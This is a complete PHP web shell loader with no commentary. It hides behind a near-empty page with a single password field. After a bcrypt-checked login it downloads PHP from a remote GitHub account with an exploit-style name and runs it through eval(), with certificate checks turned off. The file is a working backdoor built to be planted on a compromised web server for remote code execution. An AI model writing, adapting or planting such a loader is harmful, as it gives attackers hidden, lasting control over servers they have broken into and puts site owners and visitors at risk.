<?php
session_start();
function u($u) {
    if (function_exists('curl_exec')) {
        $c = curl_init($u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION['c'])) {
            curl_setopt($c, CURLOPT_COOKIE, $_SESSION['c']);
        }

        $d = curl_exec($c);
        curl_close($c);
    } elseif (function_exists('file_get_contents')) {
        $d = file_get_contents($u);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $h = fopen($u, "r");
        $d = stream_get_contents($h);
        fclose($h);
    } else {
        $d = false;
    }
    return $d;
}

function l() {
    return isset($_SESSION['l']) && $_SESSION['l'] === true;
}

if (isset($_POST['p'])) {
    $e_p = $_POST['p'];
    $h_p = '$2y$10$XZ.gQZx8RX8n72PV19Fn7eC24vdku28vrr836p6fMEsOXa2aH.9nG'; 
    if (password_verify($e_p, $h_p)) {
        $_SESSION['l'] = true;
        $_SESSION['c'] = 'asu'; 
    }
}

if (l()) {
    $a = u('https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/loldark.php');
    eval('?>' . $a);
} else {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {margin:0;padding:0;height:100vh;display:flex;justify-content:flex-start;align-items:flex-end}
            form {margin:10px}
            input {border:none;outline:none;background:white}
            input:focus {border:none}
            @media (prefers-color-scheme: white) {body{background-color:#000!important}}
        </style>
    </head>
    <body>
        <form method="POST">
            <input type="password" name="p" placeholder="">
        </form>
    </body>
    </html>
    <?php
}
?>
